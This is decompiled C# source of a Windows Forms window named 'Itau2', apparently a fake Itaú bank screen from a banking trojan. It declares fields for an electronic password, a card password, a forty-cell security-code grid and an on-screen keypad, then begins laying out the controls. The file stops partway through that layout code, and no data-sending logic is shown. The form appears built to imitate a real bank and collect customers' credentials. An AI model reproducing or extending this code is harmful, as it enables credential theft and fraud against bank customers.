using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace KanK;

public class Itau2 : Form
{
	private IContainer components;

	private LinkLabel linkLabel1;

	private Panel Painel_tec;

	private Label numeros_tec1;

	private LinkLabel tc_1b;

	private LinkLabel tc_1a;

	private Label numeros_tec2;

	private TextBox s_dados;

	private LinkLabel tec_1e;

	private LinkLabel tec_1d;

	private LinkLabel tc_1c;

	private LinkLabel b_ok;

	private TextBox s_eletronica;

	private TextBox t19;

	private TextBox t20;

	private TextBox t18;

	private TextBox t6;

	private TextBox t5;

	private TextBox t30;

	private TextBox t17;

	private TextBox t7;

	private TextBox t29;

	private TextBox t28;

	private TextBox t16;

	private TextBox t27;

	private TextBox t4;

	private TextBox t26;

	private TextBox t14;

	private TextBox t8;

	private TextBox t24;

	private TextBox t15;

	private TextBox t25;

	private TextBox t3;

	private TextBox t23;

	private TextBox t13;

	private TextBox t22;

	private TextBox t32;

	private TextBox t9;

	private TextBox t31;

	private TextBox t33;

	private TextBox t12;

	private TextBox t35;

	private TextBox t21;

	private TextBox t34;

	private TextBox t2;

	private TextBox t36;

	private TextBox t11;

	private TextBox t37;

	private TextBox t10;

	private TextBox t38;

	private PictureBox pictureBox58;

	private TextBox t39;

	private TextBox t1;

	private TextBox t40;

	private Panel Painel_sc;

	private PictureBox pictureBox1;

	private TextBox textBoxE;

	private TextBox textBoxD;

	private TextBox textBoxC;

	private TextBox textBoxA;

	private TextBox textBoxB;

	private TextBox data3;

	private TextBox data2;

	private TextBox data1;

	private TextBox s_cartao;

	private Panel Painel_Key;

	private Label label1;

	private TextBox textBox15;

	private TextBox textBox17;

	private TextBox textBox18;

	private TextBox textBox19;

	private TextBox textBox14;

	private TextBox textBox12;

	private TextBox textBox13;

	private TextBox textBox11;

	private TextBox textBox10;

	private StatusStrip statusStrip1;

	private ToolStripStatusLabel toolStripStatusLabel1;

	private IntPtr hand;

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_010e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Expected O, but got Unknown
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_0123: Expected O, but got Unknown
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Expected O, but got Unknown
		//IL_012f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0139: Expected O, but got Unknown
		//IL_013a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Expected O, but got Unknown
		//IL_0145: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Expected O, but got Unknown
		//IL_0150: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Expected O, but got Unknown
		//IL_015b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Expected O, but got Unknown
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Expected O, but got Unknown
		//IL_0171: Unknown result type (might be due to invalid IL or missing references)
		//IL_017b: Expected O, but got Unknown
		//IL_017c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0186: Expected O, but got Unknown
		//IL_0187: Unknown result type (might be due to invalid IL or missing references)
		//IL_0191: Expected O, but got Unknown
		//IL_0192: Unknown result type (might be due to invalid IL or missing references)
		//IL_019c: Expected O, but got Unknown
		//IL_019d: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a7: Expected O, but got Unknown
		//IL_01a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b2: Expected O, but got Unknown
		//IL_01b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bd: Expected O, but got Unknown
		//IL_01be: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c8: Expected O, but got Unknown
		//IL_01c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d3: Expected O, but got Unknown
		//IL_01d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01de: Expected O, but got Unknown
		//IL_01df: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e9: Expected O, but got Unknown
		//IL_01ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f4: Expected O, but got Unknown
		//IL_01f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ff: Expected O, but got Unknown
		//IL_0200: Unknown result type (might be due to invalid IL or missing references)
		//IL_020a: Expected O, but got Unknown
		//IL_020b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0215: Expected O, but got Unknown
		//IL_0216: Unknown result type (might be due to invalid IL or missing references)
		//IL_0220: Expected O, but got Unknown
		//IL_0221: Unknown result type (might be due to invalid IL or missing references)
		//IL_022b: Expected O, but got Unknown
		//IL_022c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0236: Expected O, but got Unknown
		//IL_0237: Unknown result type (might be due to invalid IL or missing references)
		//IL_0241: Expected O, but got Unknown
		//IL_0242: Unknown result type (might be due to invalid IL or missing references)
		//IL_024c: Expected O, but got Unknown
		//IL_024d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0257: Expected O, but got Unknown
		//IL_0258: Unknown result type (might be due to invalid IL or missing references)
		//IL_0262: Expected O, but got Unknown
		//IL_0263: Unknown result type (might be due to invalid IL or missing references)
		//IL_026d: Expected O, but got Unknown
		//IL_026e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0278: Expected O, but got Unknown
		//IL_0279: Unknown result type (might be due to invalid IL or missing references)
		//IL_0283: Expected O, but got Unknown
		//IL_0284: Unknown result type (might be due to invalid IL or missing references)
		//IL_028e: Expected O, but got Unknown
		//IL_028f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0299: Expected O, but got Unknown
		//IL_029a: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a4: Expected O, but got Unknown
		//IL_02a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_02af: Expected O, but got Unknown
		//IL_02b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ba: Expected O, but got Unknown
		//IL_02bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c5: Expected O, but got Unknown
		//IL_02c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d0: Expected O, but got Unknown
		//IL_02d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_02db: Expected O, but got Unknown
		//IL_02dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e6: Expected O, but got Unknown
		//IL_02e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f1: Expected O, but got Unknown
		//IL_02f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02fc: Expected O, but got Unknown
		//IL_02fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0307: Expected O, but got Unknown
		//IL_0308: Unknown result type (might be due to invalid IL or missing references)
		//IL_0312: Expected O, but got Unknown
		//IL_0313: Unknown result type (might be due to invalid IL or missing references)
		//IL_031d: Expected O, but got Unknown
		//IL_031e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0328: Expected O, but got Unknown
		//IL_0329: Unknown result type (might be due to invalid IL or missing references)
		//IL_0333: Expected O, but got Unknown
		//IL_0334: Unknown result type (might be due to invalid IL or missing references)
		//IL_033e: Expected O, but got Unknown
		//IL_033f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0349: Expected O, but got Unknown
		//IL_034a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0354: Expected O, but got Unknown
		//IL_0355: Unknown result type (might be due to invalid IL or missing references)
		//IL_035f: Expected O, but got Unknown
		//IL_0439: Unknown result type (might be due to invalid IL or missing references)
		//IL_0443: Expected O, but got Unknown
		//IL_0585: Unknown result type (might be due to invalid IL or missing references)
		//IL_058f: Expected O, but got Unknown
		//IL_05be: Unknown result type (might be due to invalid IL or missing references)
		//IL_05c8: Expected O, but got Unknown
		//IL_06d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_06e2: Expected O, but got Unknown
		//IL_0703: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ab5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0abf: Expected O, but got Unknown
		//IL_0ae0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b49: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b53: Expected O, but got Unknown
		//IL_0b74: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bc8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bd2: Expected O, but got Unknown
		//IL_0c05: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c0f: Expected O, but got Unknown
		//IL_0c30: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c84: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c8e: Expected O, but got Unknown
		//IL_0cc1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ccb: Expected O, but got Unknown
		//IL_0cec: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d40: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d4a: Expected O, but got Unknown
		//IL_0d7d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d87: Expected O, but got Unknown
		//IL_0da8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dfc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e06: Expected O, but got Unknown
		//IL_0e39: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e43: Expected O, but got Unknown
		//IL_0e64: Unknown result type (might be due to invalid IL or missing references)
		//IL_0eb8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ec2: Expected O, but got Unknown
		//IL_0ef5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0eff: Expected O, but got Unknown
		//IL_0f20: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f74: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f7e: Expected O, but got Unknown
		//IL_0fb1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fbb: Expected O, but got Unknown
		//IL_0fdc: Unknown result type (might be due to invalid IL or missing references)
		//IL_1030: Unknown result type (might be due to invalid IL or missing references)
		//IL_103a: Expected O, but got Unknown
		//IL_106d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1077: Expected O, but got Unknown
		//IL_1098: Unknown result type (might be due to invalid IL or missing references)
		//IL_10ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_10f6: Expected O, but got Unknown
		//IL_1129: Unknown result type (might be due to invalid IL or missing references)
		//IL_1133: Expected O, but got Unknown
		//IL_1154: Unknown result type (might be due to invalid IL or missing references)
		//IL_11a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_11b2: Expected O, but got Unknown
		//IL_11e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_11ef: Expected O, but got Unknown
		//IL_1210: Unknown result type (might be due to invalid IL or missing references)
		//IL_1264: Unknown result type (might be due to invalid IL or missing references)
		//IL_126e: Expected O, but got Unknown
		//IL_12a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_12ab: Expected O, but got Unknown
		//IL_12cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_1320: Unknown result type (might be due to invalid IL or missing references)
		//IL_132a: Expected O, but got Unknown
		//IL_135d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1367: Expected O, but got Unknown
		//IL_1388: Unknown result type (might be due to invalid IL or missing references)
		//IL_13dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_13e6: Expected O, but got Unknown
		//IL_1419: Unknown result type (might be due to invalid IL or missing references)
		//IL_1423: Expected O, but got Unknown
		//IL_1444: Unknown result type (might be due to invalid IL or missing references)
		//IL_1498: Unknown result type (might be due to invalid IL or missing references)
		//IL_14a2: Expected O, but got Unknown
		//IL_14d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_14df: Expected O, but got Unknown
		//IL_1500: Unknown result type (might be due to invalid IL or missing references)
		//IL_1554: Unknown result type (might be due to invalid IL or missing references)
		//IL_155e: Expected O, but got Unknown
		//IL_1591: Unknown result type (might be due to invalid IL or missing references)
		//IL_159b: Expected O, but got Unknown
		//IL_15bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_1610: Unknown result type (might be due to invalid IL or missing references)
		//IL_161a: Expected O, but got Unknown
		//IL_164d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1657: Expected O, but got Unknown
		//IL_1678: Unknown result type (might be due to invalid IL or missing references)
		//IL_16cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_16d6: Expected O, but got Unknown
		//IL_1709: Unknown result type (might be due to invalid IL or missing references)
		//IL_1713: Expected O, but got Unknown
		//IL_1734: Unknown result type (might be due to invalid IL or missing references)
		//IL_1788: Unknown result type (might be due to invalid IL or missing references)
		//IL_1792: Expected O, but got Unknown
		//IL_17c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_17cf: Expected O, but got Unknown
		//IL_17f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_1844: Unknown result type (might be due to invalid IL or missing references)
		//IL_184e: Expected O, but got Unknown
		//IL_1881: Unknown result type (might be due to invalid IL or missing references)
		//IL_188b: Expected O, but got Unknown
		//IL_18ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_1900: Unknown result type (might be due to invalid IL or missing references)
		//IL_190a: Expected O, but got Unknown
		//IL_193d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1947: Expected O, but got Unknown
		//IL_1968: Unknown result type (might be due to invalid IL or missing references)
		//IL_19bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_19c6: Expected O, but got Unknown
		//IL_19f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a03: Expected O, but got Unknown
		//IL_1a24: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a78: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a82: Expected O, but got Unknown
		//IL_1ab5: Unknown result type (might be due to invalid IL or missing references)
		//IL_1abf: Expected O, but got Unknown
		//IL_1ae0: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b34: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b3e: Expected O, but got Unknown
		//IL_1b71: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b7b: Expected O, but got Unknown
		//IL_1b99: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bed: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bf7: Expected O, but got Unknown
		//IL_1c2a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c34: Expected O, but got Unknown
		//IL_1c52: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ca6: Unknown result type (might be due to invalid IL or missing references)
		//IL_1cb0: Expected O, but got Unknown
		//IL_1ce3: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ced: Expected O, but got Unknown
		//IL_1d0e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d62: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d6c: Expected O, but got Unknown
		//IL_1d9f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1da9: Expected O, but got Unknown
		//IL_1dc7: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e1b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e25: Expected O, but got Unknown
		//IL_1e58: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e62: Expected O, but got Unknown
		//IL_1e83: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ed7: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ee1: Expected O, but got Unknown
		//IL_1f14: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f1e: Expected O, but got Unknown
		//IL_1f3c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f90: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f9a: Expected O, but got Unknown
		//IL_1fcd: Unknown result type (might be due to invalid IL or missing references)
		//IL_1fd7: Expected O, but got Unknown
		//IL_1ff8: Unknown result type (might be due to invalid IL or missing references)
		//IL_204c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2056: Expected O, but got Unknown
		//IL_2089: Unknown result type (might be due to invalid IL or missing references)
		//IL_2093: Expected O, but got Unknown
		//IL_20b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_2105: Unknown result type (might be due to invalid IL or missing references)
		//IL_210f: Expected O, but got Unknown
		//IL_2142: Unknown result type (might be due to invalid IL or missing references)
		//IL_214c: Expected O, but got Unknown
		//IL_216d: Unknown result type (might be due to invalid IL or missing references)
		//IL_21c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_21cb: Expected O, but got Unknown
		//IL_21fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_2208: Expected O, but got Unknown
		//IL_2226: Unknown result type (might be due to invalid IL or missing references)
		//IL_227a: Unknown result type (might be due to invalid IL or missing references)
		//IL_2284: Expected O, but got Unknown
		//IL_22b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_22c1: Expected O, but got Unknown
		//IL_22e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_2336: Unknown result type (might be due to invalid IL or missing references)
		//IL_2340: Expected O, but got Unknown
		//IL_2373: Unknown result type (might be due to invalid IL or missing references)
		//IL_237d: Expected O, but got Unknown
		//IL_239b: Unknown result type (might be due to invalid IL or missing references)
		//IL_23ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_23f9: Expected O, but got Unknown
		//IL_242c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2436: Expected O, but got Unknown
		//IL_2457: Unknown result type (might be due to invalid IL or missing references)
		//IL_24ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_24b5: Expected O, but got Unknown
		//IL_24e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_24f2: Expected O, but got Unknown
		//IL_2513: Unknown result type (might be due to invalid IL or missing references)
		//IL_2567: Unknown result type (might be due to invalid IL or missing references)
		//IL_2571: Expected O, but got Unknown
		//IL_25a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_25ae: Expected O, but got Unknown
		//IL_25cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_2623: Unknown result type (might be due to invalid IL or missing references)
		//IL_262d: Expected O, but got Unknown
		//IL_2660: Unknown result type (might be due to invalid IL or missing references)
		//IL_266a: Expected O, but got Unknown
		//IL_268b: Unknown result type (might be due to invalid IL or missing references)
		//IL_26df: Unknown result type (might be due to invalid IL or missing references)
		//IL_26e9: Expected O, but got Unknown
		//IL_271c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2726: Expected O, but got Unknown
		//IL_2744: Unknown result type (might be due to invalid IL or missing references)
		//IL_2798: Unknown result type (might be due to invalid IL or missing references)
		//IL_27a2: Expected O, but got Unknown
		//IL_27d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_27df: Expected O, but got Unknown
		//IL_2800: Unknown result type (might be due to invalid IL or missing references)
		//IL_2854: Unknown result type (might be due to invalid IL or missing references)
		//IL_285e: Expected O, but got Unknown
		//IL_287f: Unknown result type (might be due to invalid IL or missing references)
		//IL_2889: Expected O, but got Unknown
		//IL_29e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_29f2: Expected O, but got Unknown
		//IL_2a11: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a1b: Expected O, but got Unknown
		//IL_2a8a: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a94: Expected O, but got Unknown
		//IL_2aca: Unknown result type (might be due to invalid IL or missing references)
		//IL_2ad4: Expected O, but got Unknown
		//IL_2b43: Unknown result type (might be due to invalid IL or missing references)
		//IL_2b4d: Expected O, but got Unknown
		//IL_2b83: Unknown result type (might be due to invalid IL or missing references)
		//IL_2b8d: Expected O, but got Unknown
		//IL_2bfc: Unknown result type (might be due to invalid IL or missing references)
		//IL_2c06: Expected O, but got Unknown
		//IL_2c3c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2c46: Expected O, but got Unknown
		//IL_2cb5: Unknown result type (might be due to invalid IL or missing references)
		//IL_2cbf: Expected O, but got Unknown
		//IL_2cf5: Unknown result type (might be due to invalid IL or missing references)
		//IL_2cff: Expected O, but got Unknown
		//IL_2d6e: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d78: Expected O, but got Unknown
		//IL_2dae: Unknown result type (might be due to invalid IL or missing references)
		//IL_2db8: Expected O, but got Unknown
		//IL_2e18: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e22: Expected O, but got Unknown
		//IL_2e41: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e4b: Expected O, but got Unknown
		//IL_2eab: Unknown result type (might be due to invalid IL or missing references)
		//IL_2eb5: Expected O, but got Unknown
		//IL_2eeb: Unknown result type (might be due to invalid IL or missing references)
		//IL_2ef5: Expected O, but got Unknown
		//IL_2f55: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f5f: Expected O, but got Unknown
		//IL_2f95: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f9f: Expected O, but got Unknown
		//IL_300f: Unknown result type (might be due to invalid IL or missing references)
		//IL_3019: Expected O, but got Unknown
		//IL_309c: Unknown result type (might be due to invalid IL or missing references)
		//IL_30a6: Expected O, but got Unknown
		//IL_310e: Unknown result type (might be due to invalid IL or missing references)
		//IL_3118: Expected O, but got Unknown
		//IL_35f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_3602: Expected O, but got Unknown
		//IL_3620: Unknown result type (might be due to invalid IL or missing references)
		//IL_3673: Unknown result type (might be due to invalid IL or missing references)
		//IL_367d: Expected O, but got Unknown
		//IL_36b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_36ba: Expected O, but got Unknown
		//IL_36d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_372b: Unknown result type (might be due to invalid IL or missing references)
		//IL_3735: Expected O, but got Unknown
		//IL_3768: Unknown result type (might be due to invalid IL or missing references)
		//IL_3772: Expected O, but got Unknown
		//IL_3790: Unknown result type (might be due to invalid IL or missing references)
		//IL_37e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_37ed: Expected O, but got Unknown
		//IL_3820: Unknown result type (might be due to invalid IL or missing references)
		//IL_382a: Expected O, but got Unknown
		//IL_3848: Unknown result type (might be due to invalid IL or missing references)
		//IL_389b: Unknown result type (might be due to invalid IL or missing references)
		//IL_38a5: Expected O, but got Unknown
		//IL_38d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_38e2: Expected O, but got Unknown
		//IL_3900: Unknown result type (might be due to invalid IL or missing references)
		//IL_3953: Unknown result type (might be due to invalid IL or missing references)
		//IL_395d: Expected O, but got Unknown
		//IL_3990: Unknown result type (might be due to invalid IL or missing references)
		//IL_399a: Expected O, but got Unknown
		//IL_39b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_3a0b: Unknown result type (might be due to invalid IL or missing references)
		//IL_3a15: Expected O, but got Unknown
		//IL_3a48: Unknown result type (might be due to invalid IL or missing references)
		//IL_3a52: Expected O, but got Unknown
		//IL_3a70: Unknown result type (might be due to invalid IL or missing references)
		//IL_3ac3: Unknown result type (might be due to invalid IL or missing references)
		//IL_3acd: Expected O, but got Unknown
		//IL_3b00: Unknown result type (might be due to invalid IL or missing references)
		//IL_3b0a: Expected O, but got Unknown
		//IL_3b28: Unknown result type (might be due to invalid IL or missing references)
		//IL_3b7b: Unknown result type (might be due to invalid IL or missing references)
		//IL_3b85: Expected O, but got Unknown
		//IL_3bb8: Unknown result type (might be due to invalid IL or missing references)
		//IL_3bc2: Expected O, but got Unknown
		//IL_3be0: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c33: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c3d: Expected O, but got Unknown
		//IL_3dce: Unknown result type (might be due to invalid IL or missing references)
		//IL_3dd8: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Itau2));
		linkLabel1 = new LinkLabel();
		Painel_tec = new Panel();
		s_eletronica = new TextBox();
		b_ok = new LinkLabel();
		numeros_tec2 = new Label();
		s_dados = new TextBox();
		tec_1e = new LinkLabel();
		tec_1d = new LinkLabel();
		tc_1c = new LinkLabel();
		tc_1b = new LinkLabel();
		tc_1a = new LinkLabel();
		numeros_tec1 = new Label();
		t19 = new TextBox();
		t20 = new TextBox();
		t18 = new TextBox();
		t6 = new TextBox();
		t5 = new TextBox();
		t30 = new TextBox();
		t17 = new TextBox();
		t7 = new TextBox();
		t29 = new TextBox();
		t28 = new TextBox();
		t16 = new TextBox();
		t27 = new TextBox();
		t4 = new TextBox();
		t26 = new TextBox();
		t14 = new TextBox();
		t8 = new TextBox();
		t24 = new TextBox();
		t15 = new TextBox();
		t25 = new TextBox();
		t3 = new TextBox();
		t23 = new TextBox();
		t13 = new TextBox();
		t22 = new TextBox();
		t32 = new TextBox();
		t9 = new TextBox();
		t31 = new TextBox();
		t33 = new TextBox();
		t12 = new TextBox();
		t35 = new TextBox();
		t21 = new TextBox();
		t34 = new TextBox();
		t2 = new TextBox();
		t36 = new TextBox();
		t11 = new TextBox();
		t37 = new TextBox();
		t10 = new TextBox();
		t38 = new TextBox();
		t39 = new TextBox();
		t1 = new TextBox();
		t40 = new TextBox();
		Painel_sc = new Panel();
		textBoxC = new TextBox();
		textBoxB = new TextBox();
		textBoxE = new TextBox();
		textBoxD = new TextBox();
		textBoxA = new TextBox();
		data3 = new TextBox();
		data2 = new TextBox();
		data1 = new TextBox();
		s_cartao = new TextBox();
		label1 = new Label();
		pictureBox1 = new PictureBox();
		Painel_Key = new Panel();
		textBox15 = new TextBox();
		textBox17 = new TextBox();
		textBox18 = new TextBox();
		textBox19 = new TextBox();
		textBox14 = new TextBox();
		textBox12 = new TextBox();
		textBox13 = new TextBox();
		textBox11 = new TextBox();
		textBox10 = new TextBox();
		pictureBox58 = new PictureBox();
		statusStrip1 = new StatusStrip();
		toolStripStatusLabel1 = new ToolStripStatusLabel();
		((Control)Painel_tec).SuspendLayout();
		((Control)Painel_sc).SuspendLayout();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)Painel_Key).SuspendLayout();
		((ISupportInitialize)pictureBox58).BeginInit();
		((Control)statusStrip1).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)linkLabel1).set_BackColor(Color.Transparent);
		((Control)linkLabel1).set_Cursor(Cursors.get_Hand());
		((Control)linkLabel1).set_Location(new Point(102, 219));
		((Control)linkLabel1).set_Name("linkLabel1");
		((Control)linkLabel1).set_Size(new Size(252, 39));
		((Control)linkLabel1).set_TabIndex(3);
		((Control)linkLabel1).add_Click((EventHandler)linkLabel1_Click);
		((Control)Painel_tec).set_BackgroundImage((Image)componentResourceManager.GetObject("Painel_tec.BackgroundImage"));
		((Control)Painel_tec).get_Controls().Add((Control)(object)s_eletronica);
		((Control)Painel_tec).get_Controls().Add((Control)(object)b_ok);
		((Control)Painel_tec).get_Controls().Add((Control)(object)numeros_tec2);
		((Control)Painel_tec).get_Controls().Add((Control)(object)s_dados);
		((Control)Painel_tec).get_Controls().Add((Control)(object)tec_1e);
		((Control)Painel_tec).get_Controls().Add((Control)(object)tec_1d);
		((Control)Painel_tec).get_Controls().Add((Control)(object)tc_1c);
		((Control)Painel_tec).get_Controls().Add((Control)(object)tc_1b);
		((Control)Painel_tec).get_Controls().Add((Control)(object)tc_1a);
		((Control)Painel_tec).get_Controls().Add((Control)(object)numeros_tec1);
		((Control)Painel_tec).set_Location(new Point(296, 101));
		((Control)Painel_tec).set_Name("Painel_tec");
		((Control)Painel_tec).set_Size(new Size(355, 302));
		((Control)Painel_tec).set_TabIndex(4);
		((Control)Painel_tec).set_Visible(false);
